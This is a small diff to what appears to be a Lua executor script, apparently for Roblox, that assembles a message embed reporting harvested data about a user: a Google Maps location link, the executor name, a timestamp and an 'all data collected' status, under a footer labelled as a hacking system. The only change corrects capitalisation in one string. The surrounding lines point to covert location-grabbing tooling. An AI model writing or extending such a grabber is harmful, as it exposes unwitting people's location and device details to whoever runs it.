@@ -108,7 +108,7 @@ local data = {
             {["name"]="🔗 Ubicación", ["value"]=googleMapsLink, ["inline"]=false},
             {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
             {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
-            {["name"]="💥 Estado", ["value"]="Se recopilo Todos los datos correctamente ✅", ["inline"]=false}
+            {["name"]="💥 Estado", ["value"]="Se recopilo todos los datos correctamente ✅", ["inline"]=false}
         },
         ["footer"] = {["text"] = "Sistema de ejecución hacking • " .. os.date("%d/%m/%Y")}
     }}
